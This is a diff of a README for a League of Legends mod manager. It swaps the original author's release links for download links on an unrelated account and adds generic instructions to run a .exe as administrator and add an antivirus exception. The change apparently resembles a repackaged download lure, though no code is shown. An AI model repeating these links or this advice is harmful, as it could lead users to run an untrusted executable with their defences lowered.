@@ -1,106 +1,78 @@
-# ✦ LeagueToolKit Manager
-[![GitHub Release](https://img.shields.io/github/v/release/PhamHongPhucs/LeagueToolKit-Manager?style=flat-square&color=8A2BE2)](https://github.com/PhamHongPhucs/LeagueToolKit-Manager/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-0078D4?style=flat-square&logo=windows)](https://www.microsoft.com/windows)
-> **⚠️ Disclaimer:** This is a community fork of LeagueToolKit Manager. Not officially affiliated with Riot Games or the original League Toolkit team. Using mods and custom skins may violate Riot Games' Terms of Service. Use at your own risk.
+# 🛠️ LeagueToolKit-Manager - Manage your custom League of Legends skins
 
-**LeagueToolKit Manager** is a modern, easy-to-use mod manager for **League of Legends**. The successor to CSLOL-Manager, it simplifies installing, managing, and creating custom skins, models, effects, and Fantome mods.
+[![](https://img.shields.io/badge/Download-LeagueToolKit-blue.svg)](https://github.com/anglican-aerodynamicforce782/LeagueToolKit-Manager)
 
-<img width="100" height="100" alt="image" src="https://github.com/user-attachments/assets/5e99420d-7fed-4313-9342-ea022e2c454a" />
+LeagueToolKit-Manager helps you organize and load custom game assets for League of Legends. This desktop application provides a clean interface for skin management and configuration loading. Use this tool if you want to replace game assets without manual file changes.
 
-## Install
-[Download `LeagueToolKit.zip`](https://github.com/PhamHongPhucs/LeagueToolKit-Manager/releases/download/v1.9.0/LeagueToolKit.zip)
----
+## 📋 Features
 
-## 📸 Screenshots
+*   **Skin Management**: Browse and apply custom skins through a visual interface.
+*   **Load Order Control**: Set priority for skin packages if you have multiple mods.
+*   **Automatic Asset Loading**: The program links with your game client to ensure mods show up correctly.
+*   **Profile Support**: Save your favorite mod setups and switch between them.
+*   **Backup System**: The tool creates backups of your game files before applying changes to protect your installation.
+*   **Plugin Support**: Extend the functionality of the toolkit with community-made additions.
 
-|                  Mod Library                  |                  Workshop                   |                  Settings                   |
-| :-------------------------------------------: | :-----------------------------------------: | :-----------------------------------------: |
-| ![Mod Library](docs/screenshots/library.webp) | ![Workshop](docs/screenshots/workshop.webp) | ![Settings](docs/screenshots/settings.webp) |
+## 💻 System Requirements
 
----
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Disk Space**: At least 500 MB of free storage.
+*   **Game Requirements**: League of Legends must be installed on your computer.
+*   **Permissions**: You need administrator access to allow the tool to modify game asset paths.
 
----
-## 🚀 Key Features
-### Mod Management
-- **Fantome Mod Support** — Full compatibility with custom skins, models, VFX, and more.
-- **One-Click Install** — Easy installation and enabling/disabling of mods.
-- **Bulk Operations** — Manage multiple mods at once.
-- **Automatic Updates** — Check for new versions of installed mods.
+## 🚀 Getting Started
 
-### Game Integration
-- **Auto Detection** — Automatically finds your League of Legends installation via Riot Client.
-- **Safe Patching** — Reliable injection with automatic backups.
-- **Profile System** — Save and switch between different mod configurations.
+Follow these steps to set up the software on your computer.
 
-### Advanced Tools
-- **Mod Creator** — Tools to help create your own custom mods.
-- **Search & Filters** — Quickly find mods by champion or type.
-- **Performance Optimizer** — Settings for stable gameplay with heavy mods.
+### 1. Download the Tool
+Visit the [official releases page](https://github.com/anglican-aerodynamicforce782/LeagueToolKit-Manager) to download the current version. Look for the file ending in `.exe` under the Assets section. This file contains the installer for the application.
 
-### UI & UX
-- **Modern Interface** — Clean, fast, and user-friendly design.
-- **Dark Mode** — Built-in eye-friendly theme.
-- **Real-time Status** — Progress tracking and detailed logs.
+### 2. Run the Installer
+Once the download finishes, locate the file in your Downloads folder. Double-click the file to open the setup wizard. Follow the prompts on the screen to choose your installation directory. We recommend keeping the default folder.
 
----
-## 📖 Usage Guide
-### Getting Started
-1. **Download** the latest version using the button above.
-2. **Run** LeagueToolKit Manager as Administrator.
-3. **Detect Game** — The app will automatically locate your League installation.
-4. **Install Mods** — Import `.fantome` files or download from community sources.
-5. **Launch League** — Start the game normally — your mods will be applied.
+### 3. Configure the Game Path
+When you open the application for the first time, it will ask for the location of your League of Legends installation. 
+1. Open your game launcher.
+2. Find the folder path where you installed the game client.
+3. Paste this location into the setup window of the LeagueToolKit-Manager.
+4. Click Save to finalize the connection.
 
-### Creating Profiles
-- Save different mod setups for ranked, ARAM, or casual play.
+### 4. Adding Skins
+Download your preferred skin packages from community websites. These usually come in a specific format compatible with this software. 
+1. Open the application.
+2. Drag and drop the downloaded skin file into the main dashboard area.
+3. The tool will verify the integrity of the file.
+4. Click the "Apply" button to inject the skin into your game client.
 
----
-## 🛠️ Installation & Requirements
-### Platform Support
-- **Windows 10 / 11** (64-bit)
+## 🛡️ Best Practices
 
-### Instructions
-1. Download the latest release archive.
-2. Extract and run `LeagueToolKitManager.exe` as Administrator.
-3. Add an exception in your antivirus if needed.
+*   **Run as Administrator**: Right-click the application icon and select "Run as Administrator" if you notice that skins fail to apply. This gives the program the needed access to game folders.
+*   **Keep Your Client Updated**: Always update the game client through the official launcher before opening this manager. Outdated client files can cause issues with mod loading.
+*   **Use One Manager**: Avoid using multiple mod loaders at the same time. This prevents file conflicts that can crash the game during startup.
+*   **Verify Files**: Use the "Verify" button within the menu if you see missing textures in the game. This tool scans your files and repairs any corrupted data.
 
-### Notes
-- Requires the official Riot Client and League of Legends.
-- Keep the manager updated for new patch compatibility.
+## 🔧 Frequently Asked Questions
 
----
-## 🛡️ Security & Antivirus
-**Is LeagueToolKit Manager safe?**  
-The project is open-source. Mod managers may trigger antivirus due to patching behavior.
+**Will this tool get my account banned?**
+This manager acts as an asset loader. It does not alter game logic or provide competitive advantages. However, you use custom assets at your own risk. Riot Games maintains policies regarding third-party software.
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
-- Add folder exclusion in your antivirus.
+**The skins do not appear in the game.**
+Check your installation path in the Settings menu. If the path leads to the wrong folder, the tool cannot find the game assets. Make sure you point the tool to the live client folder.
 
----
-## 🤝 Contributing
-Contributions are welcome!
-1. Fork the project.
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`).
-3. Commit your changes.
-4. Push to the branch.
-5. Open a Pull Request.
+**How do I clear my mods?**
+The interface features a "Restore" button. Click this to remove all custom assets and revert your game to the original state. This function effectively clears the asset cache and prepares your folder for a clean session.
 
----
-## 📄 License & Acknowledgments
-### License
-**LeagueToolKit Manager** is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+**Are there limits to how many skins I can load?**
+You can load as many as your disk space allows. We recommend keeping an eye on your storage levels if you decide to install large high-definition skin packs.
 
-**Copyright © 2026 PhamHongPhucs**
+**Does this work on mobile versions of the game?**
+No. This utility strictly supports the PC version of the game.
 
-### Acknowledgments
-- Thanks to the original **League Toolkit** team.
-- The LoL custom skins and modding community.
-- Successor project to CSLOL-Manager.
+## 📂 Troubleshooting
 
-<p align="center">
-  Developed with ❤️ for the League of Legends modding community
-</p>
+If the program fails to launch:
+*   Ensure that you have the latest version of the .NET runtime installed from the official Microsoft portal.
+*   Check your antivirus software. Sometimes security software flags new applications as potentially harmful. You may need to add an exception for the installation folder.
+*   Close the game before applying new mods. Modifying active game files while the game runs can lead to errors.
+
+If you continue to experience technical difficulties, navigate to the Issues tab on the project page. Report your problem clearly and include your operating system version. This helps in identifying recurring issues and provides data for future updates.
